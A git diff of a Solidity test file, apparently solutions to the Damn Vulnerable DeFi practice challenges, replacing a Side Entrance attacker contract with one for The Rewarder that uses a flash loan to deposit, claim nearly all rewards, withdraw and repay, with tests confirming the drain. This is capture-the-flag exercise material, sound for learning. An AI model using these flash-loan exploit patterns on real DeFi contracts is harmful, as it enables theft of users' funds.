@@ -2,47 +2,132 @@
 pragma solidity 0.8.10;
 
 import "ds-test/test.sol";
-import "../the-rewarder/.sol";
+import "../the-rewarder/AccountingToken.sol";
+import "../the-rewarder/FlashLoanerPool.sol";
+import "../the-rewarder/RewardToken.sol";
+import "../the-rewarder/TheRewarderPool.sol";
+import "../DamnValuableToken.sol";
 
-contract SideEntranceAttacker {
-    SideEntranceLenderPool sideEntranceLenderPool;
-    uint256 etherInPool;
-
-    constructor(address poolAddress, uint256 totalEther) {
-        sideEntranceLenderPool = SideEntranceLenderPool(poolAddress);
-        etherInPool = totalEther;
-    }
+contract RewarderAttacker {
+    FlashLoanerPool flashLoanerPool;
+    DamnValuableToken damnValuableToken;
+    TheRewarderPool rewarderPool;
     
-    function execute() external payable {
-        sideEntranceLenderPool.deposit{value: etherInPool}();
+    uint256 tokensInPool;
+
+    constructor(address flashLoanerPoolAddress, 
+                address damnValuableTokenAddress,
+                address rewarderPoolAddress,
+                uint256 totalTokens) {
+        tokensInPool = totalTokens;
+        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
+        damnValuableToken = DamnValuableToken(damnValuableTokenAddress);
+        rewarderPool = TheRewarderPool(rewarderPoolAddress);
     }
 
+    function receiveFlashLoan(uint256 amount) external {
+        damnValuableToken.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+        rewarderPool.withdraw(amount);
+        damnValuableToken.transfer(address(flashLoanerPool), amount);
+    }
     
     function attack() external {
-        sideEntranceLenderPool.flashLoan(etherInPool);
-        sideEntranceLenderPool.withdraw();
+        flashLoanerPool.flashLoan(tokensInPool);
     }
-    
-    receive() external payable {}
 }
 
-contract SideEntranceTest is DSTest {
-    SideEntranceLenderPool sideEntranceLenderPool;
+contract User {
+    function deposit(DamnValuableToken damnValuableToken, TheRewarderPool rewarderPool, uint256 amount) public {
+        damnValuableToken.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+    }
+    
+    function distributeRewards(TheRewarderPool rewarderPool) public {
+        rewarderPool.distributeRewards();
+    }
+}
 
-    uint256 etherInPool = 1000 ether;
+interface Vm {
+    function deal(address who, uint256 amount) external;
+    function warp(uint256) external;
+    function expectRevert(bytes calldata) external;
+}
+
+contract RewarderTest is DSTest {
+    AccountingToken accountingToken;
+    DamnValuableToken damnValuableToken;
+    RewardToken rewardToken;
+    FlashLoanerPool flashLoanerPool;
+    TheRewarderPool rewarderPool;
+    User[] users;
+
+    uint256 tokensInPool = 1000000 ether;
+
+    Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        sideEntranceLenderPool = new SideEntranceLenderPool();
-	
-        sideEntranceLenderPool.deposit{value: etherInPool}();
+        damnValuableToken = new DamnValuableToken();
+
+        flashLoanerPool = new FlashLoanerPool(address(damnValuableToken));
+        damnValuableToken.transfer(address(flashLoanerPool), tokensInPool);
+        
+        rewarderPool = new TheRewarderPool(address(damnValuableToken));
+        accountingToken = rewarderPool.accToken();
+        rewardToken = rewarderPool.rewardToken();
+        
+        users = [new User(), new User(), new User(), new User()];
+        
+        for (uint8 i = 0; i < users.length; i++) {
+            uint256 amount = 100 ether;
+            
+            damnValuableToken.transfer(address(users[i]), amount);
+            users[i].deposit(damnValuableToken, rewarderPool, amount);
+        }
+        
+        emit log_uint(block.timestamp);
+        vm.warp(block.timestamp + 5 days);
+        
+        for (uint8 i = 0; i < users.length; i++) {
+            users[i].distributeRewards(rewarderPool);
+            
+            require(rewardToken.balanceOf(address(users[i])) == 25 ether);
+        }
+        
+        require(rewardToken.totalSupply() == 100 ether);
+        
+        require(rewarderPool.roundNumber() == 2);
     }
 
-    function testSideEntrance() public {
-        SideEntranceAttacker attacker = new SideEntranceAttacker(address(sideEntranceLenderPool), etherInPool);
+    function testRewarder() public {
+        emit log_uint(block.timestamp);
+        vm.warp(block.timestamp + 6 days);
+        RewarderAttacker attacker = new RewarderAttacker(address(flashLoanerPool), 
+                                                         address(damnValuableToken), 
+                                                         address(rewarderPool), 
+                                                         tokensInPool);
         
         attacker.attack();
 
-        require(address(attacker).balance == etherInPool, "Balance of this should equal the amount of tokens in the pool.");
-        require(address(sideEntranceLenderPool).balance == 0, "Balance of the pool should equal 0.");
+        // Only one round should have taken place
+        require(rewarderPool.roundNumber() == 3);
+        
+        // Users should get negligible rewards
+        for (uint8 i = 0; i < users.length; i++) {
+            uint256 rewards = rewardToken.balanceOf(address(users[i]));
+            uint256 delta = rewards - 25 ether;
+            
+            require(delta < ((1 ether) / 100));
+        }
+        
+        // Rewards must be issued to the attacker account
+        require(rewardToken.totalSupply() > 100 ether);
+
+        // Attacker's reward should be really close to 100 tokens.
+        require(100 ether - rewardToken.balanceOf(address(attacker)) < (1 ether / 10));
+        
+        // Attacker finishes with zero DVT tokens in balance
+        require(damnValuableToken.balanceOf(address(attacker)) == 0);
+        
     }
 }
